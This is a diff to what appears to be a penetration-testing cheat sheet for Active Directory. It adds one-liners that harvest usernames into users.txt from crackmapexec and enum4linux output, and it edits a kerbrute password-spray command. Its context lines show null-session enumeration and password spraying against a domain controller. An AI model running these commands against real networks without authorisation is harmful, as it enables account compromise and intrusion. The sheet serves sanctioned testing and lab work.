@@ -39,9 +39,11 @@ ldapsearch -h $TARGET_IP -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10
 ```shell
 # crackmapexec
 cme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --users
+cme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --users | tr -s ' ' | tail -n +4 | cut -d ' ' -f 5 | cut -d "\ " -f 2 | tee users.txt
 
 # enum4linux
 enum4linux -u "" -p "" -U $TARGET_IP
+enum4linux -u "" -p "" -U $TARGET_IP | grep user: | cut -d '[' -f2 | cut -d ']' -f1 > users.txt
 
 # rpcclient
 rpcclient -U "" -N $TARGET_IP
@@ -101,7 +103,7 @@ cme smb $TARGET_IP -u users.txt -p $AD_PASSWORD --continue-on-success | grep '+'
 for u in $(cat users.txt);do rpcclient -U "$AD_PASSWORD" -c "getusername;quit" $TARGET_IP | grep Authority; done
 
 # kerbrute
-kerbrute passwordspray -d DOMAIN.LOCAL --dc $TARGET_IP users.txt  "$AD_PASSWORD"
+kerbrute passwordspray -d $AD_DOMAIN --dc $TARGET_IP users.txt  "$AD_PASSWORD"
 ```
 
 
